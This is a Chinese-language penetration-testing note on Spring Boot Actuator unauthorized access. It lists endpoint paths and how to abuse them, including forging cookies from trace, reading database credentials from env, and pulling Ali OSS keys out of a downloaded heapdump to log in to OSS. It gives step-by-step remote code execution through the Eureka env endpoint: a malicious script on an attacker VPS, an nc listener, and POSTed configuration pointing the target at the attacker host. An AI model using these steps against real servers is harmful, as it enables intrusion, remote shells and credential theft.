## 漏洞概述

Actuator是Spring Boot提供的服务监控和管理中间件，默认配置会出现接口未授权访问，部分接口会泄露网站流量信息和内存信息等，使用Jolokia库特性甚至可以远程执行任意代码，获取服务器权限。

## 影响范围

```http
Spring Boot < 1.5 默认未授权访问所有端点
```

## 端点功能描述

每个端点的功能描述

```swift
路径           描述
/autoconfig    提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过
/beans         描述应用程序上下文里全部的Bean，以及它们的关系
/env           获取全部环境属性
/configprops   描述配置属性(包含默认值)如何注入Bean
/dump          获取线程活动的快照
/health        报告应用程序的健康指标，这些值由HealthIndicator的实现类提供
/info          获取应用程序的定制信息，这些信息由info打头的属性提供
/mappings      描述全部的URI路径，以及它们和控制器(包含Actuator端点)的映射关系
/metrics       报告各种应用程序度量信息，比如内存用量和HTTP请求计数
/shutdown      关闭应用程序，要求endpoints.shutdown.enabled设置为true
/trace         提供基本的HTTP请求跟踪信息(时间戳、HTTP头等)
```

Spring Boot 1.x 版本端点在根URL下注册

```http
http://xxx.com/env
```

Spring Boot 2.x 版本端点移动到/actuator/路径

```http
http://xxx.com/actuator/env
```

实战中端点可能存放在多级目录下

## 端点利用

| 端点     | 利用方式                                           |
| -------- | -------------------------------------------------- |
| trace    | 获取到近期服务器收到的请求信息，伪造cookie进行登录 |
| env      | 数据库账户等环境配置信息泄漏                       |
| heapdump | 信息下载                                           |

## env端点配置不当造成RCE

```http
条件：Eureka-Client <1.8.7（多见于Spring Cloud Netflix）
比如测试前台json报错泄露包名就是使用 netflix
```

需要以下两个包

spring-boot-starter-actuator（/refresh刷新配置需要）

spring-cloud-starter-netflix-eureka-client（功能依赖）

1、在vps服务器运行恶意构造的脚本

```bash
python env.py
```

2、在VPS用NC监听

```bash
nc -lvnp 1234
```

3、写入配置，访问/env端点

抓包将get请求改为post请求，post内容为（该ip为脚本启动的机器的ip）：

```http
eureka.client.serviceUrl.defaultZone=http://VPS-IP:2222/xstream
```

然后再访问/refresh,抓包将get请求更改为post请求，post数据随意

```http
POST /refresh
```

## SpringBoot heapdump信息泄露利用

SpringBoot heapdump可下载，导致泄露数据库连接信息以及Ali OSS key信息

1、访问以下路径能成功下载 `heapdump`

```http
https://xxx.com//actuator/heapdump
```

2、使用[VisualVM](http://visualvm.github.io/download.html)打开heapdump文件

点击Objects查看泄露的信息（可过滤）

得到alioss key之后即可使用[OSS Browser](https://github.com/aliyun/oss-browser)登录到**OSS**

## Jolokia漏洞利用（RCE）

https://xz.aliyun.com/t/7811